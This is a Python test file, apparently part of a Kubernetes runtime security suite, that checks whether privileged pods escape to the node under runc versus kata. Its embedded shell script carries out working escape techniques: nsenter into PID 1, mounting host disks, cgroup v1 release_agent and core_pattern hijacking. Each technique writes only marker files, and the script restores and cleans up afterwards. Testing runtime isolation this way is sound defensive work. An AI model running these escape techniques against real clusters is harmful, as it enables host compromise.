"""SEC-04 : un pod privilégié peut-il s'évader vers le nœud ?

Deux attaquants dans le runtime du run, root et `privileged: true` : « priv » (seul) et « privpid »
(+ `hostPID`). Chacun tente quatre techniques classiques, chacune devant écrire un fichier témoin
`kvr-sec04-<jeton>-<attaquant>-<technique>` dans le /var/tmp du « système » atteint :

1. nsenter    : `nsenter -t 1` dans tous les espaces de noms du PID 1 (avec hostPID : celui du nœud en runc,
                celui de la VM en kata) ;
2. disk-<dev> : création des nœuds de périphérique, montage des partitions. Écriture uniquement sur une
                partition DÉJÀ montée par le système (superbloc partagé) ; une partition non montée n'est
                montée qu'en lecture seule (rien n'est écrit) ;
3. release_agent : évasion cgroup v1 (si un contrôleur v1 est montable) ;
4. core_pattern  : `|/proc/%P/root/<script>` : le noyau exécute le script à la prochaine erreur de segmentation.
                   Ancienne valeur restaurée aussitôt, restauration vérifiée.

Le constat vient d'une sonde runc distincte (hostPath /var/tmp du nœud) : un témoin présent = évasion
réelle jusqu'au nœud. Les témoins sont ensuite supprimés (sonde et attaquant).
Attendu (plan) : runc → nœud compromis ; kata → confiné à la VM (aucun témoin sur le nœud).
"""

from kvr import escape

META = {"intrusive": "évasion réelle depuis un pod privilégié : écrit un fichier témoin sur le nœud (supprimé), "
                     "modifie brièvement core_pattern et release_agent (restaurés)",
        "id": "SEC-04", "category": "SEC", "aspect": "SEC", "priority": "P1",
        "title": "Pod privilégié : évasion vers le nœud", "runs": 2, "warmup": False}

ATTACK = r"""
T=$1; L=$2; M="kvr-sec04-$T-$L"; W=/tmp/kvr-written; : > $W
res() { echo "TECH $1 $2 $3"; }

# 1. nsenter vers le PID 1
if out=$(nsenter -t 1 -m -u -i -n -p -- sh -c "echo kvr > /var/tmp/$M-nsenter && echo ok" 2>&1); then
  res nsenter tenté "pid1=$(cat /proc/1/comm 2>/dev/null)"
else
  res nsenter refusé "$(echo "$out" | head -c 150 | tr '\n' ' ')"
fi

# 2. disques
for dev in $(ls /sys/class/block); do
  [ -b /dev/$dev ] || mknod /dev/$dev b $(tr ':' ' ' < /sys/class/block/$dev/dev) 2>/dev/null
  d=/mnt/kvr-$dev; mkdir -p $d
  if mount -o ro,norecovery,nouuid /dev/$dev $d 2>/dev/null || mount -o ro /dev/$dev $d 2>/dev/null; then
    # partition non montée ailleurs : lecture seule, on ne fait que constater l'accès
    vt=$(ls -d $d/ostree/deploy/*/var/tmp $d/var/tmp 2>/dev/null | head -1)
    res disk-$dev lecture-seule "${vt:+var/tmp présent}"
    umount $d 2>/dev/null
  elif mount /dev/$dev $d 2>/dev/null; then
    # déjà montée par le système (superbloc partagé) : écriture du témoin
    hit=
    for v in $d/ostree/deploy/*/var/tmp $d/var/tmp; do
      [ -d "$v" ] || continue
      if echo kvr > "$v/$M-disk-$dev" 2>/dev/null; then echo "$v/$M-disk-$dev" >> $W; hit=1; fi
    done
    res disk-$dev $([ -n "$hit" ] && echo écrit || echo monté-sans-var-tmp) "partition montée par le système"
  fi
done

# 3. release_agent (cgroup v1)
mkdir -p /tmp/kvr-cg; cgok=
for c in rdma memory pids cpuset; do mount -t cgroup -o $c cgroup /tmp/kvr-cg 2>/dev/null && { cgok=$c; break; }; done
if [ -n "$cgok" ]; then
  up=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
  if [ -n "$up" ]; then
    old_ra=$(cat /tmp/kvr-cg/release_agent)
    printf '#!/bin/sh\necho kvr > /var/tmp/%s-release_agent\n' "$M" > /kvr-ra; chmod +x /kvr-ra
    mkdir -p /tmp/kvr-cg/kvr && echo 1 > /tmp/kvr-cg/kvr/notify_on_release
    if echo "$up/kvr-ra" > /tmp/kvr-cg/release_agent 2>/dev/null; then
      sh -c "echo \$\$ > /tmp/kvr-cg/kvr/cgroup.procs"; sleep 3
      echo "$old_ra" > /tmp/kvr-cg/release_agent
      res release_agent tenté "contrôleur v1 $cgok ; restauré=$([ "$(cat /tmp/kvr-cg/release_agent)" = "$old_ra" ] && echo oui || echo NON)"
    else
      res release_agent refusé "écriture release_agent impossible"
    fi
    rmdir /tmp/kvr-cg/kvr 2>/dev/null
  else
    res release_agent non-applicable "chemin hôte du conteneur inconnu (pas d'overlay visible)"
  fi
  umount /tmp/kvr-cg
else
  res release_agent non-applicable "aucun contrôleur cgroup v1 montable"
fi

# 4. core_pattern
old_cp=$(cat /proc/sys/kernel/core_pattern)
printf '#!/bin/sh\necho kvr > /var/tmp/%s-core_pattern\n' "$M" > /kvr-core; chmod +x /kvr-core
if echo "|/proc/%P/root/kvr-core" > /proc/sys/kernel/core_pattern 2>/dev/null; then
  trap 'printf "%s\n" "$old_cp" > /proc/sys/kernel/core_pattern' EXIT
  bash -c 'ulimit -c unlimited; kill -SEGV $$' 2>/dev/null; sleep 3
  printf '%s\n' "$old_cp" > /proc/sys/kernel/core_pattern
  res core_pattern tenté "restauré=$([ "$(cat /proc/sys/kernel/core_pattern)" = "$old_cp" ] && echo oui || echo NON)"
else
  res core_pattern refusé "/proc/sys/kernel/core_pattern non modifiable"
fi
echo FIN
"""

CLEANUP = r"""
while read -r f; do rm -f "$f"; done < /tmp/kvr-written 2>/dev/null
for d in /mnt/kvr-*; do umount "$d" 2>/dev/null; done
rm -f /kvr-ra /kvr-core
echo NETTOYÉ
"""

NODE_CHECK = r"""
T=$1
for f in /nodetmp/kvr-sec04-$T-*; do [ -e "$f" ] && echo "FOUND $(basename $f)"; done
rm -f /nodetmp/kvr-sec04-$T-*
left=$(ls /nodetmp/kvr-sec04-$T-* 2>/dev/null | wc -l); echo "LEFT $left"
"""


def run(ctx):
    tok = escape.token()
    ctx.grant_scc("privileged")
    attackers = {"priv": {}, "privpid": {"host_pid": True}}
    first = escape.deploy(ctx, "priv", privileged=True, run_as_user=0, memory="512Mi")
    node = first["spec"]["nodeName"]
    try:
        escape.deploy(ctx, "privpid", privileged=True, run_as_user=0, host_pid=True, node_name=node, memory="512Mi")
    except Exception as e:  # hostPID peut être refusé ou non supporté par le runtime : on le constate
        ctx.observe(f"pod privilégié + hostPID non démarré ({type(e).__name__}) : technique non évaluée")
        del attackers["privpid"]
    escape.deploy(ctx, "nodecheck", rc="runc", privileged=True, run_as_user=0, node_name=node,
                  host_paths=[{"path": "/var/tmp", "mount": "/nodetmp", "ro": False}])

    attempts: dict[str, dict[str, tuple[str, str]]] = {}
    try:
        for label in attackers:
            rc, out, err = escape.run_sh(ctx, label, ATTACK, tok, label, timeout_s=300)
            ctx.evidence(f"attack-{label}.txt", f"rc={rc}\n{out}\n{err[-1500:]}")
            attempts[label] = {t: (s, rest[0] if rest else "") for t, s, *rest in escape.lines_with(out, "TECH")}
        rc, out, err = escape.run_sh(ctx, "nodecheck", NODE_CHECK, tok, timeout_s=120)
        ctx.evidence("node-check.txt", f"rc={rc}\n{out}\n{err[-500:]}")
        found = [l.split()[1] for l in out.splitlines() if l.startswith("FOUND ")]
        left = next((l.split()[1] for l in out.splitlines() if l.startswith("LEFT ")), "?")
    finally:
        for label in attackers:
            try:
                escape.run_sh(ctx, label, CLEANUP, timeout_s=120)
            except Exception as e:
                ctx.observe(f"nettoyage {label} en échec : {e}")

    prefix = f"kvr-sec04-{tok}-"
    escapes = {}
    for label, techs in attempts.items():
        hits = sorted(f.removeprefix(prefix + label + "-") for f in found if f.startswith(prefix + label + "-"))
        escapes[label] = hits
        ctx.metric(f"node_escapes_{label}", len(hits), "count", "lower")
    restore_ko = [f"{label}:{t}" for label, techs in attempts.items() for t, (s, d) in techs.items() if "restauré=NON" in d]
    ctx.metric("node_settings_not_restored", len(restore_ko), "count", "lower")

    def summary(label):
        techs = attempts.get(label, {})
        parts = [f"{t}={'ÉVASION' if t in escapes[label] else s}" for t, (s, _) in techs.items()]
        return f"{label} [{', '.join(parts)}]"

    total = sum(len(v) for v in escapes.values())
    ctx.observe(f"{ctx.runtime} : {total} technique(s) ont atteint le nœud (témoin trouvé par la sonde runc) ; "
                + " ; ".join(summary(l) for l in attackers)
                + f" ; témoins restants après nettoyage : {left}"
                + (f" ; ⚠ RÉGLAGE NON RESTAURÉ : {restore_ko}" if restore_ko else ""))
    if restore_ko or left not in ("0", 0):
        return "FAIL"
    expected_escape = ctx.runtime == "runc"
    return "PASS" if (total > 0) == expected_escape else "FAIL"
